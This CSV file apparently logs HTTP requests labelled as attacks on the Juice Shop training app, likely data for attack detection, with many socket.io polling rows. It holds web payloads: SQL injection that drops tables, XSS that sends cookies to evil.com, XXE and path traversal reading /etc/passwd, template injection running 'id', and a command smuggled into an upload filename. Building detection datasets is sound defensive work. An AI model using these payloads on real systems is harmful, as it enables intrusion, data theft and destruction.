source_app,label,method,path,body,status_code,response_size
juiceshop,attack,POST,/api/BasketItems,"{\x22ProductId\x22: 23, \x22BasketId\x22: 99, \x22quantity\x22: 999}",401,245
juiceshop,attack,PUT,/api/BasketItems/75,{\x22quantity\x22: \x22{\x5C\x22$gt\x5C\x22: \x5C\x22\x5C\x22}\x22},401,245
juiceshop,attack,DELETE,/api/Users/674,,401,245
juiceshop,attack,GET,/api/Users/15,,401,245
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWGySD&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWH1Jj&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,POST,/api/Users,"{\x22email\x22: \x22test8215@test.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22${T(java.lang.Runtime).getRuntime().exec('id')}\x22}",201,308
juiceshop,attack,PUT,/api/Users/36,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,245
juiceshop,attack,DELETE,/api/Challenges/1,,401,245
juiceshop,attack,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,,200,2992
juiceshop,attack,POST,/file-upload,--d976eb6fe02b198814cfae7cf851fd9d\x0D\x0AContent-Disposition: form-data; name=\x22file\x22; filename=\x22test& ls -la.jpg\x22\x0D\x0AContent-Type: image/jpeg\x0D\x0A\x0D\x0Afake image content\x0D\x0A--d976eb6fe02b198814cfae7cf851fd9d--\x0D\x0A,204,0
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWH1Jn&sid=SbspUjGrg7PI3q_MAAAI,,200,234
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWH2ei&sid=SbspUjGrg7PI3q_MAAAI,"42[\x22notification received\x22,\x223ca7d41d1c903c5ae68c2f713c9f875db870aca0\x22]",200,2
juiceshop,attack,GET,/rest/continue-code,,200,79
juiceshop,attack,PUT,/api/BasketItems/427,{\x22quantity\x22: 0},401,245
juiceshop,attack,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,,401,245
juiceshop,attack,GET,/rest/products/search?q=%27%20UNION%20SELECT%20NULL--,,500,367
juiceshop,attack,POST,/rest/user/login,"{\x22email\x22: \x22admin' #\x22, \x22password\x22: \x22anything\x22}",500,464
juiceshop,attack,PUT,/api/Users/13,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,245
juiceshop,attack,DELETE,/api/Challenges/1,,401,245
juiceshop,attack,GET,/rest/products/download/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,,500,362
juiceshop,attack,POST,/api/Users,"{\x22email\x22: \x22attacker2928@evil.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22totpSecret\x22: \x22\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22test\x22}",201,314
juiceshop,attack,PUT,/api/Products/..%25252f..%25252f..%25252fetc/passwd,{\x22name\x22: \x22hacked\x22},500,355
juiceshop,attack,DELETE,/api/Addresss/340,,401,31
juiceshop,attack,GET,/api/Products/1%3B%20DROP%20TABLE%20products%3B--,,404,35
juiceshop,attack,POST,/api/Complaints,{\x22message\x22: \x22<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>\x22},401,245
juiceshop,attack,PUT,/api/BasketItems/449,{\x22quantity\x22: 0},401,245
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWH2ej&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWH7QI&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,DELETE,/api/Products/329,,401,245
juiceshop,attack,GET,/api/Orders/577,,500,337
juiceshop,attack,POST,/file-upload,--9ed22df03168ced51673c9a53ff30e19\x0D\x0AContent-Disposition: form-data; name=\x22file\x22; filename=\x22malicious.xml\x22\x0D\x0AContent-Type: application/xml\x0D\x0A\x0D\x0A<?xml version=\x221.0\x22?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \x22file:///etc/passwd\x22>]><foo>&xxe;</foo>\x0D\x0A--9ed22df03168ced51673c9a53ff30e19--\x0D\x0A,410,614
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWH7QL&sid=SbspUjGrg7PI3q_MAAAI,,200,275
juiceshop,attack,GET,/rest/continue-code,,200,79
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWH8Dw&sid=SbspUjGrg7PI3q_MAAAI,"42[\x22notification received\x22,\x225fd213c8fc772846b262c307eaaa901340a195bb\x22]",200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWH8D-&sid=SbspUjGrg7PI3q_MAAAI,,200,330
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWH8Eo&sid=SbspUjGrg7PI3q_MAAAI,"42[\x22notification received\x22,\x225a196f6f8335ad860de5fd4597a69de8f23dbce8\x22]",200,2
juiceshop,attack,GET,/rest/continue-code,,304,0
juiceshop,attack,PUT,/api/Products/..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd,{\x22name\x22: \x22hacked\x22},500,358
juiceshop,attack,DELETE,/api/Products/1,,401,245
juiceshop,attack,GET,/rest/products/download/php%3A//filter/convert.base64-encode/resource%3Dindex.php,,500,381
juiceshop,attack,POST,/api/Complaints,{\x22message\x22: \x22<audio src=x onerror=alert('XSS')>\x22},401,245
juiceshop,attack,PUT,/api/Users/60,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,245
juiceshop,attack,DELETE,/api/Challenges/1,,401,245
juiceshop,attack,GET,/rest/products/search?q=%26%2360%3Bscript%26%2362%3Balert%28%27XSS%27%29%26%2360%3B/script%26%2362%3B,,500,411
juiceshop,attack,POST,/api/Users,{\x22email\x22: \x22test@test.com\x22},201,304
juiceshop,attack,PUT,/api/Products/..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,,400,157
juiceshop,attack,DELETE,/api/Products/1,,200,30
juiceshop,attack,GET,/api/Products?name=vbscript%3Amsgbox%28%27XSS%27%29,,200,30
juiceshop,attack,POST,/api/Users,"{\x22email\x22: \x22test6248@test.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22{{self.__class__.__mro__[2].__subclasses__()}}\x22}",201,308
juiceshop,attack,PUT,/api/Users/35,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",404,35
juiceshop,attack,DELETE,/api/Products/file%3A///etc/passwd,,500,347
juiceshop,attack,GET,/rest/products/search?q=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E,,500,371
juiceshop,attack,POST,/rest/user/login,"{\x22email\x22: \x22'; DELETE FROM users;--\x22, \x22password\x22: \x22anything\x22}",401,26
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWH8Ep&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWHDW_&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,PUT,/api/BasketItems/437,{\x22quantity\x22: 0},401,31
juiceshop,attack,DELETE,/api/Products/..%252F..%252F..%252Fetc%252Fpasswd,,404,35
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWHDX0&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWHJe4&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWHJe6&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWHPlE&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWHPlF&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWHVrr&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWHVrt&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWHbz3&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWHbz5&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWHi3o&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWHi3q&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWHoAl&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWHoAq&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWHuHD&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWHuHQ&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWH-O4&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWH-O7&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWI4UT&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWI4UW&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWIAay&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWIAa-&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWIGhV&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWIGhp&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWIMoP&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWIMoR&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWISvF&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWISvG&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWIY_d&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWIY_f&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWIf6I&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWIf6J&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWIlDU&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWIlDV&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWIrPn&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWIrPp&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWIxYO&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWIxYR&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJ1f6&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJ1f7&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJ7lS&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJ7ly&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJDry&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJDr-&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJJzg&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJJzh&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJQ4N&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJQ4O&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJWB7&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJWBe&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJcID&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJcIG&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJiPH&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJiPJ&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJoVx&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJoVy&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJucV&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJucY&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWJ-jB&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWJ-jF&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWK4qy&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWK4q-&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKAyH&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKAyJ&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKH2q&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKH2t&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKN9c&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKN9d&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKTGW&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKTGX&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKZN0&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKZNL&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKfUI&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKfUJ&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKlap&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKlaw&sid=SbspUjGrg7PI3q_MAAAI,,200,1
juiceshop,attack,POST,/socket.io/?EIO=4&transport=polling&t=PhWKrhI&sid=SbspUjGrg7PI3q_MAAAI,3,200,2
juiceshop,attack,GET,/socket.io/?EIO=4&transport=polling&t=PhWKrhK&sid=SbspUjGrg7PI3q_MAAAI,,200,1
